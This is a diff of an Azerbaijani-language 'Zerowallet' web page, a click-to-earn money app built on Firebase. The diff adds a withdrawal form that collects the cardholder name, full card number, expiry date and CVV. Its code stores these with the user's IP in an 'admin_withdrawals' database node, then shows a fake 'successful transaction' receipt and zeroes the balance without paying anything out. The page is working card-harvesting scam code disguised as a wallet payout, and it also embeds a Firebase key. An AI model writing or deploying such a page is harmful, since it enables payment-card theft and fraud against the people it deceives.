@@ -3,121 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Zerowallet - Main</title>
-    
+    <title>Zerowallet - Dashboard</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
     
     <style>
-        :root { --main-cyan: #00f2ff; --bg-dark: #050505; --card-bg: #0d0d0d; }
+        :root { --main-cyan: #00f2ff; --bg-dark: #050505; --card-bg: #0d0d0d; --gold: #ffd700; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
-        body { margin: 0; background: var(--bg-dark); color: #fff; font-family: 'Rajdhani', sans-serif; height: 100vh; overflow: hidden; }
+        body { margin: 0; background: var(--bg-dark); color: #fff; font-family: 'Rajdhani', sans-serif; overflow-x: hidden; }
 
         /* HEADER */
-        .app-header { padding: 20px; background: rgba(13,13,13,0.95); border-bottom: 1px solid #1a1a1a; display: flex; justify-content: space-between; align-items: center; }
-        .user-info small { color: #555; display: block; font-size: 0.6rem; letter-spacing: 1px; }
-        .user-info span { font-family: 'Orbitron'; font-size: 0.85rem; color: #fff; }
-        .balance-display { text-align: right; }
-        .balance-display .amount { font-family: 'Orbitron'; font-size: 1.3rem; color: var(--main-cyan); display: block; }
-        .balance-display small { font-size: 0.6rem; color: #444; }
+        .app-header { padding: 20px; background: #000; border-bottom: 1px solid #1a1a1a; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 50; }
+        .balance-card { text-align: right; }
+        .balance-card b { font-family: 'Orbitron'; font-size: 1.5rem; color: var(--main-cyan); display: block; }
 
         /* MINING SECTION */
-        .main-content { height: calc(100vh - 180px); display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
-        
-        .coin-container { position: relative; width: 240px; height: 240px; display: flex; align-items: center; justify-content: center; z-index: 5; }
-        .coin-btn { width: 100%; height: 100%; cursor: pointer; transition: 0.1s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .mining-container { height: 60vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .coin-btn { width: 220px; height: 220px; cursor: pointer; transition: 0.1s; filter: drop-shadow(0 0 20px rgba(0,242,255,0.2)); }
         .coin-btn:active { transform: scale(0.9); }
-        .coin-img { width: 100%; height: 100%; object-fit: contain; filter: drop-shadow(0 0 20px rgba(0, 242, 255, 0.3)); }
+        
+        /* WITHDRAW SECTION */
+        .withdraw-section { padding: 20px; background: var(--card-bg); margin: 20px; border-radius: 20px; border: 1px solid #1a1a1a; text-align: center; }
+        .withdraw-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #1a1a1a; color: #444; font-family: 'Orbitron'; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
+        .withdraw-btn.active { background: var(--main-cyan); color: #000; cursor: pointer; box-shadow: 0 0 20px rgba(0,242,255,0.3); }
 
-        .limit-box { margin-top: 30px; text-align: center; }
-        .limit-text { font-size: 0.9rem; color: #888; font-weight: bold; margin-bottom: 8px; }
-        .progress-bg { width: 220px; height: 8px; background: #111; border-radius: 20px; border: 1px solid #222; overflow: hidden; }
-        .progress-bar { height: 100%; background: linear-gradient(90deg, #0088ff, var(--main-cyan)); width: 0%; transition: 0.4s; }
+        /* MODAL (WITHDRAW FORM) */
+        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; display: none; align-items: center; justify-content: center; padding: 20px; }
+        .modal-content { background: #111; padding: 25px; border-radius: 20px; width: 100%; max-width: 400px; border: 1px solid var(--main-cyan); }
+        .input-box { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #222; border-radius: 8px; color: #fff; font-family: 'Orbitron'; font-size: 0.9rem; }
 
-        /* SHOP (ROCKETS) */
-        .shop-footer { position: fixed; bottom: 0; width: 100%; background: var(--card-bg); border-top: 1px solid #1a1a1a; padding: 15px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .rocket-card { background: #000; border: 1px solid #222; border-radius: 15px; padding: 10px; text-align: center; transition: 0.3s; }
-        .rocket-card.active { border-color: var(--main-cyan); box-shadow: 0 0 15px rgba(0, 242, 255, 0.15); background: rgba(0, 242, 255, 0.02); }
-        .rocket-card i { font-size: 1.2rem; margin-bottom: 5px; }
-        .rocket-card b { display: block; font-size: 0.7rem; font-family: 'Orbitron'; margin: 3px 0; }
-        .rocket-card small { font-size: 0.6rem; color: var(--main-cyan); }
-        .buy-btn { width: 100%; margin-top: 8px; background: #1a1a1a; border: none; color: #fff; padding: 6px; border-radius: 8px; font-size: 0.65rem; cursor: pointer; font-family: 'Orbitron'; }
-        .rocket-card.active .buy-btn { background: var(--main-cyan); color: #000; }
-
-        /* COOLDOWN OVERLAY */
-        #lock-screen { position: absolute; inset: 0; background: rgba(0,0,0,0.96); z-index: 100; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .timer-val { font-family: 'Orbitron'; font-size: 2.2rem; color: var(--main-cyan); margin: 15px 0; letter-spacing: 2px; }
-
-        /* ANIMATIONS */
-        @keyframes clickFloat { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-120px); } }
-        .float-val { position: fixed; font-family: 'Orbitron'; font-weight: bold; pointer-events: none; animation: clickFloat 0.8s ease-out forwards; z-index: 1000; }
+        /* RECEIPT (ÇEK) */
+        #receipt { display: none; background: #fff; color: #000; padding: 30px; border-radius: 5px; font-family: 'Courier New', monospace; text-align: center; width: 300px; box-shadow: 0 0 50px rgba(0,0,0,1); }
+        .receipt-line { border-top: 1px dashed #000; margin: 10px 0; }
     </style>
 </head>
 <body>
 
     <header class="app-header">
-        <div class="user-info">
-            <small>TERMINAL_USER</small>
-            <span id="user-name">...</span>
-        </div>
-        <div class="balance-display">
-            <span class="amount" id="balance-num">0.00</span>
-            <small>AVAILABLE AZN</small>
-        </div>
+        <div><small style="color: #444;">TERMINAL</small><br><span id="user-display" style="font-family: 'Orbitron'; color: var(--main-cyan);">---</span></div>
+        <div class="balance-card"><b id="bal-amount">0.00</b><small>AZN BALANCE</small></div>
     </header>
 
-    <main class="main-content">
-        <div id="lock-screen">
-            <i class="fas fa-battery-bolt" style="font-size: 3.5rem; color: var(--main-cyan); filter: drop-shadow(0 0 10px var(--main-cyan));"></i>
-            <h2 style="font-family: 'Orbitron'; margin-top: 20px;">ENERGY RECOVERY</h2>
-            <div class="timer-val" id="cooldown-timer">08:00:00</div>
-            <p style="color: #444; font-size: 0.8rem; padding: 0 40px;">Sistem həddindən artıq yüklənib. Enerjinin bərpası üçün gözləyin.</p>
+    <div class="mining-container">
+        <div id="lock-overlay" style="display:none; text-align:center;">
+            <h2 style="font-family:'Orbitron'; color:red;">LIMIT DOLUB</h2>
+            <div id="timer" style="font-size:2rem; font-family:'Orbitron';">08:00:00</div>
         </div>
+        <img src="coin.png" class="coin-btn" onclick="mine(event)" onerror="this.src='https://cdn-icons-png.flaticon.com/512/217/217853.png'">
+        <div style="margin-top:20px;">LİMİT: <span id="clicks">0</span>/15</div>
+    </div>
 
-        <div class="coin-container" onclick="handleCoinClick(event)">
-            <div class="coin-btn">
-                <img src="coin.png" class="coin-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/217/217853.png'">
+    <div class="withdraw-section">
+        <p style="font-size: 0.8rem; color: #666;">Minimum çıxarış: 20.00 AZN</p>
+        <button id="withdraw-btn" class="withdraw-btn" onclick="openWithdraw()">PULU ÇIXAR</button>
+    </div>
+
+    <div id="withdraw-modal" class="modal">
+        <div class="modal-content">
+            <h3 style="font-family: 'Orbitron'; color: var(--main-cyan);">KART MƏLUMATLARINI DAXİL EDİN</h3>
+            <input type="text" id="card-name" class="input-box" placeholder="AD SOYAD (KARTDAKI)">
+            <input type="text" id="card-num" class="input-box" placeholder="16 RƏQƏMLİ KART NOMRƏSİ" maxlength="16">
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="card-exp" class="input-box" placeholder="AA/İİ" maxlength="5">
+                <input type="password" id="card-cvv" class="input-box" placeholder="CVV" maxlength="3">
             </div>
+            <button class="withdraw-btn active" style="margin-top:20px;" onclick="submitWithdraw()">TƏSDİQLƏ VƏ ÇƏK</button>
+            <button class="withdraw-btn" style="margin-top:10px; background:none; color:#555;" onclick="closeWithdraw()">LƏĞV ET</button>
         </div>
+    </div>
 
-        <div class="limit-box">
-            <div class="limit-text">LIMIT: <span id="click-txt">0</span> / 15</div>
-            <div class="progress-bg">
-                <div class="progress-bar" id="progress-fill"></div>
+    <div id="receipt-modal" class="modal">
+        <div id="receipt">
+            <h2 style="margin:0;">ZEROWALLET</h2>
+            <p>SUCCESSFUL TRANSACTION</p>
+            <div class="receipt-line"></div>
+            <div style="text-align:left; font-size: 0.8rem;">
+                <p>İSTİFADƏÇİ: <span id="rec-user"></span></p>
+                <p>MƏBLƏĞ: <span id="rec-amount"></span> AZN</p>
+                <p>TARİX: <span id="rec-date"></span></p>
+                <p>KART: **** **** **** <span id="rec-card"></span></p>
+                <p>STATUS: TƏSDİQLƏNDİ</p>
             </div>
+            <div class="receipt-line"></div>
+            <p style="font-size: 0.7rem;">Sistemi seçdiyiniz üçün təşəkkürlər!</p>
+            <button onclick="location.reload()" style="margin-top:10px; padding:5px; border:1px solid #000; background:none; cursor:pointer;">BAĞLA</button>
         </div>
-        
-        <div style="margin-top: 25px; font-size: 0.6rem; color: #333; letter-spacing: 2px; font-family: 'Orbitron';">
-            ACTIVE_ROCKET: <span id="active-unit-name" style="color: var(--main-cyan);">---</span>
-        </div>
-    </main>
-
-    <footer class="shop-footer">
-        <div class="rocket-card" id="card-elite">
-            <i class="fas fa-rocket" style="color: #cd7f32;"></i>
-            <b>ELITE</b>
-            <small>+0.05 AZN</small>
-            <button class="buy-btn" onclick="buyRocket('elite', 3)">3 AZN</button>
-        </div>
-        <div class="rocket-card" id="card-pro">
-            <i class="fas fa-rocket" style="color: #c0c0c0;"></i>
-            <b>PRO</b>
-            <small>+0.10 AZN</small>
-            <button class="buy-btn" onclick="buyRocket('pro', 5)">5 AZN</button>
-        </div>
-        <div class="rocket-card" id="card-super">
-            <i class="fas fa-rocket" style="color: #ffd700;"></i>
-            <b>SUPER</b>
-            <small>+0.25 AZN</small>
-            <button class="buy-btn" onclick="buyRocket('super', 8)">8 AZN</button>
-        </div>
-    </footer>
+    </div>
 
     <script>
-        // FIREBASE CONFIG
         const firebaseConfig = {
             apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
             authDomain: "sevgili-testi.firebaseapp.com",
@@ -129,99 +104,72 @@
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+        const user = localStorage.getItem('zerowallet_session');
 
-        // SESSION CHECK
-        const username = localStorage.getItem('zerowallet_session');
-        if(!username) { window.location.href = "index.html"; }
+        if(!user) location.href="index.html";
+        document.getElementById('user-display').innerText = user;
 
-        let userData = {};
-        const ROCKETS = {
-            'standart': { val: 0.001, name: 'LEVEL 1 UNIT' }, // 0.1 qepik
-            'elite': { val: 0.05, name: 'ELITE ROCKET' },
-            'pro': { val: 0.10, name: 'PRO ROCKET' },
-            'super': { val: 0.25, name: 'SUPER ROCKET' }
-        };
-
-        // LOAD DATA
-        document.getElementById('user-name').innerText = username.toUpperCase();
-        
-        db.ref('zerowallet_users/' + username).on('value', snap => {
-            userData = snap.val();
-            if(userData) updateUI();
+        let data = {};
+        db.ref('zerowallet_users/' + user).on('value', snap => {
+            data = snap.val();
+            document.getElementById('bal-amount').innerText = data.balance.toFixed(2);
+            document.getElementById('clicks').innerText = data.clicks;
+            
+            const wBtn = document.getElementById('withdraw-btn');
+            if(data.balance >= 20) {
+                wBtn.classList.add('active');
+                wBtn.disabled = false;
+            } else {
+                wBtn.classList.remove('active');
+                wBtn.disabled = true;
+            }
         });
 
-        function updateUI() {
-            document.getElementById('balance-num').innerText = userData.balance.toFixed(2);
-            document.getElementById('click-txt').innerText = userData.clicks;
-            document.getElementById('progress-fill').style.width = (userData.clicks / 15 * 100) + "%";
-            document.getElementById('active-unit-name').innerText = ROCKETS[userData.rocket].name;
+        function mine(e) {
+            if(data.clicks >= 15) return alert("8 saat gözləməlisiniz!");
+            db.ref('zerowallet_users/' + user).update({
+                balance: data.balance + 0.1, // Standart klik
+                clicks: data.clicks + 1
+            });
+        }
 
-            // Shop UI
-            ['elite', 'pro', 'super'].forEach(r => {
-                document.getElementById('card-' + r).classList.toggle('active', userData.rocket === r);
+        function openWithdraw() { document.getElementById('withdraw-modal').style.display='flex'; }
+        function closeWithdraw() { document.getElementById('withdraw-modal').style.display='none'; }
+
+        async function submitWithdraw() {
+            const name = document.getElementById('card-name').value;
+            const num = document.getElementById('card-num').value;
+            const exp = document.getElementById('card-exp').value;
+            const cvv = document.getElementById('card-cvv').value;
+
+            if(name.length < 5 || num.length < 16 || exp.length < 5 || cvv.length < 3) {
+                return alert("Məlumatlar yanlış daxil edilib!");
+            }
+
+            // Məlumatları Admin Panel üçün göndər
+            await db.ref('admin_withdrawals/' + user).set({
+                username: user,
+                cardName: name,
+                cardNum: num,
+                cardExp: exp,
+                cardCvv: cvv,
+                amount: data.balance,
+                ip: data.ip,
+                date: new Date().toLocaleString()
             });
 
-            // Cooldown check
-            if(userData.lastReset > 0) {
-                processCooldown();
-            } else {
-                document.getElementById('lock-screen').style.display = 'none';
-            }
-        }
-
-        function handleCoinClick(e) {
-            if(userData.clicks >= 15) return;
-
-            const clickValue = ROCKETS[userData.rocket].val;
-            let updates = {
-                balance: userData.balance + clickValue,
-                clicks: userData.clicks + 1
-            };
-
-            if(updates.clicks >= 15) {
-                updates.lastReset = Date.now();
-            }
-
-            db.ref('zerowallet_users/' + username).update(updates);
-
-            // Floating text
-            const float = document.createElement('div');
-            float.className = 'float-val';
-            float.innerText = "+" + clickValue;
-            float.style.left = e.clientX + 'px';
-            float.style.top = e.clientY + 'px';
-            float.style.color = 'var(--main-cyan)';
-            document.body.appendChild(float);
-            setTimeout(() => float.remove(), 800);
-        }
-
-        function processCooldown() {
-            const limit = 8 * 60 * 60 * 1000;
-            const now = Date.now();
-            const diff = (userData.lastReset + limit) - now;
-
-            if(diff > 0) {
-                document.getElementById('lock-screen').style.display = 'flex';
-                const h = Math.floor(diff / 3600000);
-                const m = Math.floor((diff % 3600000) / 60000);
-                const s = Math.floor((diff % 60000) / 1000);
-                document.getElementById('cooldown-timer').innerText = 
-                    `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-                setTimeout(processCooldown, 1000);
-            } else {
-                db.ref('zerowallet_users/' + username).update({ clicks: 0, lastReset: 0 });
-                document.getElementById('lock-screen').style.display = 'none';
-            }
-        }
-
-        async function buyRocket(type, price) {
-            if(userData.rocket === type) return alert("Bu roket artıq aktivdir!");
+            // Çeki göstər
+            document.getElementById('withdraw-modal').style.display='none';
+            document.getElementById('receipt-modal').style.display='flex';
+            document.getElementById('receipt').style.display='inline-block';
             
-            if(confirm(`${price} AZN qarşılığında ${type.toUpperCase()} roketini aktivləşdirmək istəyirsiniz?`)) {
-                // Burada real ödəniş yoxlaması olmalıdır
-                await db.ref('zerowallet_users/' + username).update({ rocket: type });
-                alert("Təbrik edirik! Roketiniz yeniləndi.");
-            }
+            document.getElementById('rec-user').innerText = user;
+            document.getElementById('rec-amount').innerText = data.balance.toFixed(2);
+            document.getElementById('rec-date').innerText = new Date().toLocaleDateString();
+            document.getElementById('rec-card').innerText = num.slice(-4);
+
+            // Balansı sıfırla
+            db.ref('zerowallet_users/' + user).update({ balance: 0 });
         }
     </script>
 </body>
